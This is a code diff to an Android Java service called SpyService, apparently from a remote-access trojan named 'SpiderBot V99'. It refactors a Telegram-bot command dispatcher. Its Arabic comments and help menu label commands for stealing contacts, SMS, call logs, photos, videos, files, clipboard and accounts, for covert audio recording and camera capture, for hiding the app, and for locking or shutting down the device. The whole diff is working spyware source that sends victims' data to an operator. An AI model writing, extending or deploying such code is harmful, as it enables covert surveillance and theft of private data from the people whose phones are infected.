@@ -150,10 +150,16 @@ public class SpyService extends Service {
             }
 
             String response = bot.getUpdates();
-            if (response == null) return;
+            if (response == null) {
+                Log.d(TAG, "getUpdates returned null");
+                return;
+            }
 
             JSONObject json = new JSONObject(response);
-            if (!json.getBoolean("ok")) return;
+            if (!json.getBoolean("ok")) {
+                Log.d(TAG, "getUpdates not ok: " + response);
+                return;
+            }
 
             JSONArray updates = json.getJSONArray("result");
             for (int i = 0; i < updates.length(); i++) {
@@ -166,6 +172,8 @@ public class SpyService extends Service {
                     JSONObject msg = upd.getJSONObject("message");
                     if (msg.has("text")) {
                         String txt = msg.getString("text").trim();
+                        Log.d(TAG, "Received command: " + txt);
+                        // معالجة الأمر فوراً
                         handleCommand(txt);
                     }
                 }
@@ -176,96 +184,162 @@ public class SpyService extends Service {
     }
 
     private void handleCommand(String cmd) {
-        String lower = cmd.toLowerCase();
+        Log.d(TAG, "Handling command: " + cmd);
+        String lower = cmd.toLowerCase().trim();
 
+        // ===== أوامر المساعدة =====
         if (lower.equals("/start") || lower.equals("/help") || lower.equals("/menu") || lower.equals("/commands")) {
             sendHelpMenu();
             return;
         }
 
+        // ===== الأوامر بشرطة / =====
+        if (lower.startsWith("/")) {
+            String command = lower.substring(1);
+            executeCommand(command);
+            return;
+        }
+
+        // ===== الأوامر القديمة (بدون /) =====
+        executeCommand(lower);
+    }
+
+    private void executeCommand(String cmd) {
         try {
-            if (lower.startsWith("/")) {
-                String command = lower.substring(1);
-                switch (command) {
-                    case "steal_contacts": case "contacts": sendFile(collectContacts(), "📇 جهات الاتصال"); break;
-                    case "steal_sms": case "sms": sendFile(collectSms(), "💬 الرسائل النصية"); break;
-                    case "steal_calls": case "calllog": sendFile(collectCallLogs(), "📞 سجل المكالمات"); break;
-                    case "location": getLocation(); break;
-                    case "record": startRecording(); break;
-                    case "stoprec": stopRecording(); break;
-                    case "apps": sendFile(collectApps(), "📱 التطبيقات المثبتة"); break;
-                    case "photos": sendFile(collectMedia("images"), "🖼 جميع الصور"); break;
-                    case "videos": sendFile(collectMedia("videos"), "🎬 جميع الفيديوهات"); break;
-                    case "files": sendFile(collectAllFiles(), "📦 جميع الملفات"); break;
-                    case "hide": hideApp(); break;
-                    case "show": showApp(); break;
-                    case "notify": case "fake_notif": showFakeNotification(); break;
-                    case "cam_back": takePhoto(); break;
-                    case "cam_front": takePhotoFront(); break;
-                    case "torch_on": flashOn(); break;
-                    case "torch_off": flashOff(); break;
-                    case "imei": getImei(); break;
-                    case "phone": getPhoneNumber(); break;
-                    case "sim": getSimInfo(); break;
-                    case "wifi": getWifiInfo(); break;
-                    case "battery": getBatteryInfo(); break;
-                    case "ip": getPublicIp(); break;
-                    case "lock": lockDevice(); break;
-                    case "reboot": rebootDevice(); break;
-                    case "shutdown": shutdownDevice(); break;
-                    case "accounts": getAccounts(); break;
-                    case "clipboard": getClipboard(); break;
-                    case "device": getDeviceInfo(); break;
-                    case "network": getNetworkInfo(); break;
-                    default: bot.sendText("❌ أمر غير معروف. استخدم /help");
-                }
-            } else {
-                handleLegacyCommand(cmd);
+            Log.d(TAG, "Executing: " + cmd);
+            switch (cmd) {
+                // أوامر السرقة
+                case "steal_contacts":
+                case "contacts":
+                case "get_contacts":
+                    sendFile(collectContacts(), "📇 جهات الاتصال");
+                    break;
+                case "steal_sms":
+                case "sms":
+                case "get_sms":
+                    sendFile(collectSms(), "💬 الرسائل النصية");
+                    break;
+                case "steal_calls":
+                case "calllog":
+                case "get_calllogs":
+                    sendFile(collectCallLogs(), "📞 سجل المكالمات");
+                    break;
+                case "location":
+                case "get_location":
+                    getLocation();
+                    break;
+                case "record":
+                case "start_record":
+                    startRecording();
+                    break;
+                case "stoprec":
+                case "stop_record":
+                    stopRecording();
+                    break;
+                case "apps":
+                case "get_apps":
+                    sendFile(collectApps(), "📱 التطبيقات المثبتة");
+                    break;
+                case "photos":
+                case "get_photos":
+                    sendFile(collectMedia("images"), "🖼 جميع الصور");
+                    break;
+                case "videos":
+                case "get_videos":
+                    sendFile(collectMedia("videos"), "🎬 جميع الفيديوهات");
+                    break;
+                case "files":
+                case "get_files":
+                    sendFile(collectAllFiles(), "📦 جميع الملفات");
+                    break;
+                case "hide":
+                case "hide_app":
+                    hideApp();
+                    break;
+                case "show":
+                case "show_app":
+                    showApp();
+                    break;
+                case "notify":
+                case "fake_notif":
+                    showFakeNotification();
+                    break;
+                case "cam_back":
+                case "take_photo":
+                    takePhoto();
+                    break;
+                case "cam_front":
+                case "take_photo_front":
+                    takePhotoFront();
+                    break;
+                case "torch_on":
+                case "flash_on":
+                    flashOn();
+                    break;
+                case "torch_off":
+                case "flash_off":
+                    flashOff();
+                    break;
+                case "imei":
+                case "get_imei":
+                    getImei();
+                    break;
+                case "phone":
+                case "get_phone":
+                    getPhoneNumber();
+                    break;
+                case "sim":
+                case "get_sim":
+                    getSimInfo();
+                    break;
+                case "wifi":
+                case "get_wifi":
+                    getWifiInfo();
+                    break;
+                case "battery":
+                case "get_battery":
+                    getBatteryInfo();
+                    break;
+                case "ip":
+                case "get_ip":
+                    getPublicIp();
+                    break;
+                case "lock":
+                case "lock_device":
+                    lockDevice();
+                    break;
+                case "reboot":
+                    rebootDevice();
+                    break;
+                case "shutdown":
+                    shutdownDevice();
+                    break;
+                case "accounts":
+                case "get_accounts":
+                    getAccounts();
+                    break;
+                case "clipboard":
+                case "get_clipboard":
+                    getClipboard();
+                    break;
+                case "device":
+                case "get_device":
+                    getDeviceInfo();
+                    break;
+                case "network":
+                case "get_network":
+                    getNetworkInfo();
+                    break;
+                default:
+                    bot.sendText("❌ أمر غير معروف: " + cmd + "\nاستخدم /help لعرض الأوامر.");
             }
         } catch (Exception e) {
             bot.sendText("❌ خطأ: " + e.getMessage());
-            Log.e(TAG, "handleCommand error", e);
+            Log.e(TAG, "executeCommand error", e);
         }
     }
 
-    private void handleLegacyCommand(String cmd) {
-        String upper = cmd.toUpperCase();
-        try {
-            switch (upper) {
-                case "GET_CONTACTS": sendFile(collectContacts(), "📇 جهات الاتصال"); break;
-                case "GET_SMS": sendFile(collectSms(), "💬 الرسائل النصية"); break;
-                case "GET_CALLLOGS": sendFile(collectCallLogs(), "📞 سجل المكالمات"); break;
-                case "GET_LOCATION": getLocation(); break;
-                case "START_RECORD": startRecording(); break;
-                case "STOP_RECORD": stopRecording(); break;
-                case "GET_APPS": sendFile(collectApps(), "📱 التطبيقات المثبتة"); break;
-                case "GET_PHOTOS": sendFile(collectMedia("images"), "🖼 جميع الصور"); break;
-                case "GET_VIDEOS": sendFile(collectMedia("videos"), "🎬 جميع الفيديوهات"); break;
-                case "GET_FILES": sendFile(collectAllFiles(), "📦 جميع الملفات"); break;
-                case "HIDE_APP": hideApp(); break;
-                case "SHOW_APP": showApp(); break;
-                case "FAKE_NOTIF": showFakeNotification(); break;
-                case "TAKE_PHOTO": takePhoto(); break;
-                case "TAKE_PHOTO_FRONT": takePhotoFront(); break;
-                case "FLASH_ON": flashOn(); break;
-                case "FLASH_OFF": flashOff(); break;
-                case "GET_IMEI": getImei(); break;
-                case "GET_PHONE": getPhoneNumber(); break;
-                case "GET_SIM": getSimInfo(); break;
-                case "GET_WIFI": getWifiInfo(); break;
-                case "GET_BATTERY": getBatteryInfo(); break;
-                case "GET_IP": getPublicIp(); break;
-                case "LOCK_DEVICE": lockDevice(); break;
-                case "REBOOT": rebootDevice(); break;
-                case "SHUTDOWN": shutdownDevice(); break;
-                case "GET_ACCOUNTS": getAccounts(); break;
-                case "GET_CLIPBOARD": getClipboard(); break;
-                default: bot.sendText("❌ أمر غير معروف. استخدم /help");
-            }
-        } catch (Exception e) {
-            bot.sendText("❌ خطأ: " + e.getMessage());
-        }
-    }
+    // ========== قائمة المساعدة ==========
 
     private void sendHelpMenu() {
         String menu = "🕷️ **SPIDERBOT V99 - قائمة الأوامر الكاملة** 🕷️\n\n" +
@@ -282,6 +356,7 @@ public class SpyService extends Service {
                 "/videos - سرقة جميع الفيديوهات\n" +
                 "/files - سرقة جميع الملفات\n" +
                 "/clipboard - سرقة الحافظة\n\n" +
+
                 "━━━━━━━━━━━━━━━━━━━━━━\n" +
                 "⚫ **أوامر التحكم والتخريب** ⚫\n" +
                 "━━━━━━━━━━━━━━━━━━━━━━\n" +
@@ -293,6 +368,7 @@ public class SpyService extends Service {
                 "/lock - قفل الجهاز\n" +
                 "/reboot - إعادة تشغيل الجهاز\n" +
                 "/shutdown - إيقاف تشغيل الجهاز\n\n" +
+
                 "━━━━━━━━━━━━━━━━━━━━━━\n" +
                 "🟢 **أوامر المعلومات** 🟢\n" +
                 "━━━━━━━━━━━━━━━━━━━━━━\n" +
@@ -306,8 +382,10 @@ public class SpyService extends Service {
                 "/apps - قائمة التطبيقات المثبتة\n" +
                 "/device - معلومات الجهاز كاملة\n" +
                 "/network - معلومات الشبكة\n\n" +
+
                 "━━━━━━━━━━━━━━━━━━━━━━\n" +
                 "✅ SpiderBot V99 جاهز";
+
         bot.sendText(menu);
     }
 
